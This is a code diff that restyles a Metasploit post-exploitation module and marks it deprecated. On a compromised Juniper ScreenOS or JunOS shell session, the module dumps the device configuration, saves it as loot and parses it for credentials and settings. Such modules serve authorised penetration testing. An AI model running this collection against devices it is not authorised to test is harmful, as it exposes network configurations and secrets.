@@ -7,22 +7,27 @@ require 'msf/core/auxiliary/juniper'
 
 class MetasploitModule < Msf::Post
   include Msf::Auxiliary::Juniper
-  def initialize(info={})
-    super( update_info( info,
-      'Name'          => 'Juniper Gather Device General Information',
-      'Description'   => %q{
-        This module collects a Juniper ScreenOS and JunOS device information and configuration.
+  include Msf::Exploit::Deprecated
+  moved_from 'post/juniper/gather/enum_juniper'
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Juniper Gather Device General Information',
+        'Description' => %q{
+          This module collects a Juniper ScreenOS and JunOS device information and configuration.
         },
-      'License'       => MSF_LICENSE,
-      'Author'        => [ 'h00die'],
-      'Platform'      => [ 'juniper'],
-      'SessionTypes'  => [ 'shell' ]
-    ))
+        'License' => MSF_LICENSE,
+        'Author' => [ 'h00die'],
+        'Platform' => [ 'juniper'],
+        'SessionTypes' => [ 'shell' ]
+      )
+    )
   end
 
   def run
     # Get device prompt
-    prompt = session.shell_command("")
+    prompt = session.shell_command('')
 
     os_type = 'junos'
     command_prefix = ''
@@ -71,19 +76,19 @@ class MetasploitModule < Msf::Post
 
     case os_type
     when /screenos/
-      ver_loc = store_loot("juniper.screenos.config",
-        "text/plain",
-        session,
-        system_out.strip,
-        "config.txt",
-        "Juniper ScreenOS Config")
+      ver_loc = store_loot('juniper.screenos.config',
+                           'text/plain',
+                           session,
+                           system_out.strip,
+                           'config.txt',
+                           'Juniper ScreenOS Config')
     when /junos/
-      ver_loc = store_loot("juniper.junos.config",
-        "text/plain",
-        session,
-        system_out.strip,
-        "config.txt",
-        "Juniper JunOS Config")
+      ver_loc = store_loot('juniper.junos.config',
+                           'text/plain',
+                           session,
+                           system_out.strip,
+                           'config.txt',
+                           'Juniper JunOS Config')
     end
 
     # Print the version of VERBOSE set to true.
@@ -95,30 +100,32 @@ class MetasploitModule < Msf::Post
 
   # run commands found in exec mode under privilege 1
   def enum_configs(prompt, os_type, command_prefix)
-    host,port = session.session_host, session.session_port
+    host = session.session_host
+    port = session.session_port
     exec_commands = [
       {
-        'cmd'  => {'junos' => 'show configuration', 'screenos' => 'get config'},
-        'fn'   => 'get_config',
+        'cmd' => { 'junos' => 'show configuration', 'screenos' => 'get config' },
+        'fn' => 'get_config',
         'desc' => 'Get Device Config on Juniper Device'
       },
     ]
     exec_commands.each do |ec|
       command = command_prefix + ec['cmd'][os_type]
-      cmd_out = session.shell_command(command).gsub(/#{command}|#{prompt}/,"")
-      next if cmd_out =~ /unknown keyword/ #screenOS
+      cmd_out = session.shell_command(command).gsub(/#{command}|#{prompt}/, '')
+      next if cmd_out =~ /unknown keyword/ # screenOS
+
       print_status("Gathering info from #{command}")
       cmd_loc = store_loot("juniper.#{ec['fn']}",
-        "text/plain",
-        session,
-        cmd_out.strip,
-        "#{ec['fn']}.txt",
-        ec['desc'])
+                           'text/plain',
+                           session,
+                           cmd_out.strip,
+                           "#{ec['fn']}.txt",
+                           ec['desc'])
       vprint_good("Saving to #{cmd_loc}")
       if os_type == 'screenos'
-        juniper_screenos_config_eater(host,port,cmd_out.strip)
+        juniper_screenos_config_eater(host, port, cmd_out.strip)
       else os_type == 'junos'
-        juniper_junos_config_eater(host,port,cmd_out.strip)
+           juniper_junos_config_eater(host, port, cmd_out.strip)
       end
     end
   end
